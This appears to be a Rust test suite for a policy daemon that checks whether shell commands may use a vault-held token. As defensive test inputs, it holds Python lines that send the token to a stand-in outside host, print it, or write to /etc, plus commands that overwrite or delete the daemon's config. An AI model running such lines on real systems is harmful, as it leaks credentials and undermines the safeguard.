//! The relay the config file names may hand its python one secret, from
//! the vault, and only to read. With no config file there is no relay.

use std::os::unix::fs::PermissionsExt;
use std::path::Path;

fn verdict(dir: &Path, config: &Path, seat: &str, line: &str) -> String {
    let out = std::process::Command::new(env!("CARGO_BIN_EXE_ljos-policyd"))
        .args(["check", "--", "bash", "-c", line])
        .current_dir(dir)
        .stdin(std::process::Stdio::null())
        .env("PHRONESIS_STATE_DIR", dir.join("state"))
        .env("LJOS_POLICYD_CONFIG", config)
        .env("LJOS_SEAT", seat)
        .env_remove("PHRONESIS_WORKSPACE")
        .env_remove("PHRONESIS_JANET_PACK")
        .env_remove("PHRONESIS_PREFIX")
        .env_remove("PHRONESIS_PACK_ROOT")
        .env_remove("CDPATH")
        .env_remove("BASH_ENV")
        .env_remove("ENV")
        .output()
        .expect("spawn check");
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

#[test]
fn the_configured_relay_reads_its_secret_from_the_vault() {
    let base = std::env::temp_dir().join(format!("relay-config-{}", std::process::id()));
    let dir = base.join("relay");
    std::fs::create_dir_all(dir.join("sub")).unwrap();
    let config = base.join("config.toml");
    std::fs::write(
        &config,
        format!(
            "[relay]\nseat = \"relay\"\ndir = \"{}\"\nsecret = \"EXAMPLE_TOKEN\"\nhost = \"example.org\"\n",
            dir.display()
        ),
    )
    .unwrap();
    let mode = |m: u32| std::fs::set_permissions(&config, std::fs::Permissions::from_mode(m));
    mode(0o600).unwrap();
    let read = r#"import os; t = os.environ["EXAMPLE_TOKEN"]"#;
    let run = |code: &str| {
        let p = dir.join("send.py");
        std::fs::write(&p, code).unwrap();
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o600)).unwrap();
        "nimvault run --env EXAMPLE_TOKEN relay/token python3 -I send.py".to_string()
    };

    let refused = |dir: &Path, config: &Path, seat: &str, line: &str| {
        let v = verdict(dir, config, seat, line);
        assert!(v.starts_with("deny"), "{line}: {v}");
        v
    };
    let shown = refused(
        &dir,
        &config,
        "relay",
        &run(r#"import os; print(os.environ["EXAMPLE_TOKEN"])"#),
    );
    assert!(shown.contains("shows-secret"), "{shown}");
    let sent = run(&format!(
        r#"{read}; import urllib.request; urllib.request.urlopen("https://example.org/bot" + t, data=b"x")"#
    ));
    assert_eq!(verdict(&dir, &config, "relay", &sent), "allow");
    let elsewhere = refused(
        &dir,
        &config,
        "relay",
        &run(&format!(
            r#"{read}; import urllib.request; urllib.request.urlopen("https://example.net/bot" + t, data=b"x")"#
        )),
    );
    assert!(elsewhere.contains("sends-secret"), "{elsewhere}");
    let used = run(&format!("{read}; print(len(t))"));
    assert_eq!(verdict(&dir, &config, "relay", &used), "allow");
    let inline =
        format!("nimvault run --env EXAMPLE_TOKEN relay/token python3 -c '{read}; print(len(t))'");
    for line in [
        inline.clone(),
        format!("cd . && {used}"),
        format!("python3 -c '{read}; print(len(t))'"),
        format!(". ./env && python3 -c '{read}; print(len(t))'"),
        used.replace("python3 -I", "/usr/bin/python3 -I"),
        inline.replace("EXAMPLE_TOKEN", "OTHER_TOKEN"),
    ] {
        refused(&dir, &config, "relay", &line);
    }
    refused(&dir, &config, "other", &used);
    refused(&dir.join("sub"), &config, "relay", &used);
    refused(&dir, &base.join("missing.toml"), "relay", &used);
    mode(0o620).unwrap();
    refused(&dir, &config, "relay", &used);
    mode(0o602).unwrap();
    refused(&dir, &config, "relay", &used);
    let _ = std::fs::remove_dir_all(&base);
}

#[test]
fn the_configured_relay_runs_a_script_it_owns() {
    let base = std::env::temp_dir().join(format!("relay-script-{}", std::process::id()));
    let dir = base.join("relay");
    std::fs::create_dir_all(&dir).unwrap();
    let config = base.join("config.toml");
    std::fs::write(
        &config,
        format!(
            "[relay]\nseat = \"relay\"\ndir = \"{}\"\nsecret = \"EXAMPLE_TOKEN\"\nhost = \"example.org\"\n",
            dir.display()
        ),
    )
    .unwrap();
    std::fs::set_permissions(&config, std::fs::Permissions::from_mode(0o600)).unwrap();
    let send = "import os, sys, urllib.parse, urllib.request\n\
        token = os.environ[\"EXAMPLE_TOKEN\"]\n\
        text = open(sys.argv[1]).read()\n\
        data = urllib.parse.urlencode({\"chat_id\": sys.argv[2], \"text\": text}).encode()\n\
        url = f\"https://example.org/bot{token}/sendMessage\"\n\
        with urllib.request.urlopen(url, data=data, timeout=20) as r:\n    r.read()\n";
    let script = |name: &str, code: &str, mode: u32| {
        for e in std::fs::read_dir(&dir).unwrap().flatten() {
            if e.path().extension().is_some_and(|x| x == "py") {
                std::fs::remove_file(e.path()).unwrap();
            }
        }
        let p = dir.join(name);
        std::fs::write(&p, code).unwrap();
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(mode)).unwrap();
    };
    std::fs::write(base.join("out.py"), send).unwrap();
    let run =
        |s: &str| format!("nimvault run --env EXAMPLE_TOKEN relay/token python3 -I {s} msg.txt 42");
    let v = |seat: &str, config: &Path, line: &str| verdict(&dir, config, seat, line);

    script("send.py", send, 0o600);
    assert_eq!(v("relay", &config, &run("send.py")), "allow");
    let dashed = run("send.py").replace("token python3", "token -- python3");
    assert_eq!(v("relay", &config, &dashed), "allow");
    for (seat, config) in [("other", config.clone()), ("relay", base.join("none.toml"))] {
        let d = v(seat, &config, &run("send.py"));
        assert!(d.starts_with("deny"), "{seat}: {d}");
    }
    std::os::unix::fs::symlink(dir.join("send.py"), dir.join("link.py")).unwrap();
    let d = v("relay", &config, &run("link.py"));
    assert!(d.starts_with("deny"), "link.py: {d}");
    script(
        "show.py",
        "import os\nprint(os.environ[\"EXAMPLE_TOKEN\"])\n",
        0o600,
    );
    let shown = v("relay", &config, &run("show.py"));
    assert!(
        shown.starts_with("deny") && shown.contains("shows-secret"),
        "{shown}"
    );
    script("far.py", &send.replace("example.org", "example.net"), 0o600);
    let far = v("relay", &config, &run("far.py"));
    assert!(
        far.starts_with("deny") && far.contains("sends-secret"),
        "{far}"
    );
    script("open.py", send, 0o620);
    for s in ["open.py", "../out.py", "missing.py"] {
        let d = v("relay", &config, &run(s));
        assert!(d.starts_with("deny"), "{s}: {d}");
    }
    let _ = std::fs::remove_dir_all(&base);
}

#[test]
fn the_relay_send_script_runs_as_written() {
    let base = std::env::temp_dir().join(format!("relay-send-{}", std::process::id()));
    let dir = base.join("relay");
    std::fs::create_dir_all(&dir).unwrap();
    let config = base.join("config.toml");
    std::fs::write(
        &config,
        format!(
            "[relay]\nseat = \"relay\"\ndir = \"{}\"\nsecret = \"EXAMPLE_TOKEN\"\nhost = \"example.org\"\n",
            dir.display()
        ),
    )
    .unwrap();
    std::fs::set_permissions(&config, std::fs::Permissions::from_mode(0o600)).unwrap();
    let send = include_str!("fixtures/relay-send.py");
    let token = r#"os.environ["EXAMPLE_TOKEN"]"#;
    let cases = [
        ("send.py", send.to_string(), "allow"),
        (
            "shown.py",
            send.replace(r#"print(r.get("ok"))"#, &format!("print({token})")),
            "shows-secret",
        ),
        (
            "logged.py",
            send.replace("\"tag\":tag,", &format!("\"tag\":{token},")),
            "shows-secret",
        ),
        (
            "far.py",
            send.replace("example.org", "example.net"),
            "sends-secret",
        ),
        (
            "plain.py",
            send.replace("https://", "http://"),
            "sends-secret",
        ),
        (
            "etc.py",
            send.replace("\"history.jsonl\"", "\"/etc/x\""),
            "writes-outside",
        ),
        (
            "tail.py",
            send.replace("\"history.jsonl\"", "\"/sendMessage\""),
            "writes-outside",
        ),
    ];
    for (name, code, want) in &cases {
        let p = dir.join(name);
        std::fs::write(&p, code).unwrap();
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o600)).unwrap();
        let line = format!(
            "nimvault run --env EXAMPLE_TOKEN {}/env python3 -I {name} /tmp/m.txt t1",
            dir.display()
        );
        let v = verdict(&dir, &config, "relay", &line);
        if *want == "allow" {
            assert_eq!(v, "allow", "{name}");
        } else {
            assert!(v.starts_with("deny") && v.contains(want), "{name}: {v}");
        }
        std::fs::remove_file(&p).unwrap();
    }
    let line = format!(
        "nimvault run --env EXAMPLE_TOKEN {}/env python3 -I send.py /tmp/m.txt t1",
        dir.display()
    );
    assert!(verdict(&dir, &config, "other", &line).starts_with("deny"));
    let _ = std::fs::remove_dir_all(&base);
}

#[test]
fn the_relay_script_runs_isolated_and_alone() {
    let base = std::env::temp_dir().join(format!("relay-alone-{}", std::process::id()));
    let dir = base.join("relay");
    std::fs::create_dir_all(&dir).unwrap();
    let config = base.join("config.toml");
    std::fs::write(
        &config,
        format!(
            "[relay]\nseat = \"relay\"\ndir = \"{}\"\nsecret = \"EXAMPLE_TOKEN\"\nhost = \"example.org\"\n",
            dir.display()
        ),
    )
    .unwrap();
    std::fs::set_permissions(&config, std::fs::Permissions::from_mode(0o600)).unwrap();
    let send = dir.join("send.py");
    std::fs::write(&send, include_str!("fixtures/relay-send.py")).unwrap();
    std::fs::set_permissions(&send, std::fs::Permissions::from_mode(0o600)).unwrap();
    let line = "nimvault run --env EXAMPLE_TOKEN relay/token python3 -I send.py /tmp/m.txt t1";
    assert_eq!(verdict(&dir, &config, "relay", line), "allow");
    let bare = line.replace("python3 -I", "python3");
    let v = verdict(&dir, &config, "relay", &bare);
    assert!(v.starts_with("deny"), "{v}");
    for shadow in ["json.py", "usercustomize.py", "sitecustomize.py"] {
        let p = dir.join(shadow);
        std::fs::write(&p, "").unwrap();
        let v = verdict(&dir, &config, "relay", line);
        assert!(v.starts_with("deny"), "{shadow}: {v}");
        std::fs::remove_file(&p).unwrap();
    }
    assert_eq!(verdict(&dir, &config, "relay", line), "allow");
    let _ = std::fs::remove_dir_all(&base);
}

#[test]
fn no_seat_writes_the_policyd_config() {
    let base = std::env::temp_dir().join(format!("relay-guard-{}", std::process::id()));
    let dir = base.join("work");
    std::fs::create_dir_all(&dir).unwrap();
    let config = base.join("conf/relay.toml");
    let c = config.display();
    for seat in ["relay", "other", ""] {
        for line in [
            format!("echo x > {c}"),
            format!("printf x | tee -a {c}"),
            format!("cp /tmp/x {c}"),
            format!("sed -i 's/a/b/' {c}"),
            format!("rm -f {c}"),
            format!("cd {} && echo x > relay.toml", base.join("conf").display()),
            "echo x > ~/.config/ljos-policyd/config.toml".to_string(),
            "mkdir -p ~/.config/ljos-policyd".to_string(),
        ] {
            let v = verdict(&dir, &config, seat, &line);
            assert!(
                v.starts_with("deny\tseat-guard-path:"),
                "{seat}: {line}: {v}"
            );
        }
        for line in [
            format!("cat {c}"),
            format!("echo x > {}", base.join("conf/other.toml").display()),
            "cat ~/.config/ljos-policyd/config.toml".to_string(),
        ] {
            assert_eq!(
                verdict(&dir, &config, seat, &line),
                "allow",
                "{seat}: {line}"
            );
        }
    }
    let _ = std::fs::remove_dir_all(&base);
}

#[test]
fn the_relay_line_refuses_unsigned_entries() {
    let base = std::env::temp_dir().join(format!("relay-signed-{}", std::process::id()));
    let dir = base.join("relay");
    std::fs::create_dir_all(&dir).unwrap();
    let config = base.join("config.toml");
    std::fs::write(
        &config,
        format!(
            "[relay]\nseat = \"relay\"\ndir = \"{}\"\nsecret = \"EXAMPLE_TOKEN\"\nhost = \"example.org\"\n",
            dir.display()
        ),
    )
    .unwrap();
    std::fs::set_permissions(&config, std::fs::Permissions::from_mode(0o600)).unwrap();
    let send = dir.join("send.py");
    std::fs::write(&send, include_str!("fixtures/relay-send.py")).unwrap();
    std::fs::set_permissions(&send, std::fs::Permissions::from_mode(0o600)).unwrap();
    let line = "nimvault run --env EXAMPLE_TOKEN relay/token python3 -I send.py /tmp/m.txt t1";
    assert_eq!(verdict(&dir, &config, "relay", line), "allow");
    let unsigned = line.replace("run --env", "run --allow-unsigned --env");
    let v = verdict(&dir, &config, "relay", &unsigned);
    assert!(v.starts_with("deny"), "{v}");
    let _ = std::fs::remove_dir_all(&base);
}

#[test]
fn the_relay_may_still_source_its_env_file() {
    let base = std::env::temp_dir().join(format!("relay-envfile-{}", std::process::id()));
    let dir = base.join("relay");
    std::fs::create_dir_all(&dir).unwrap();
    let config = base.join("config.toml");
    std::fs::write(
        &config,
        format!(
            "[relay]\nseat = \"relay\"\ndir = \"{}\"\nsecret = \"EXAMPLE_TOKEN\"\nhost = \"example.org\"\n",
            dir.display()
        ),
    )
    .unwrap();
    std::fs::set_permissions(&config, std::fs::Permissions::from_mode(0o600)).unwrap();
    let send = dir.join("send.py");
    std::fs::write(&send, include_str!("fixtures/relay-send.py")).unwrap();
    std::fs::set_permissions(&send, std::fs::Permissions::from_mode(0o600)).unwrap();
    std::fs::write(dir.join("env"), "EXAMPLE_TOKEN=placeholder\n").unwrap();
    for line in [
        ". ./env && python3 -I send.py /tmp/m.txt t1",
        "set -a; . ./env; set +a; python3 -I send.py /tmp/m.txt t1",
        "source ./env && python3 send.py /tmp/m.txt t1",
    ] {
        for seat in ["relay", "other"] {
            assert_eq!(
                verdict(&dir, &config, seat, line),
                "allow",
                "{seat}: {line}"
            );
        }
    }
    let shown = ". ./env && python3 -c 'import os; print(os.environ[\"EXAMPLE_TOKEN\"])'";
    for seat in ["relay", "other"] {
        let v = verdict(&dir, &config, seat, shown);
        assert!(v.starts_with("deny"), "{seat}: {v}");
    }
    let _ = std::fs::remove_dir_all(&base);
}
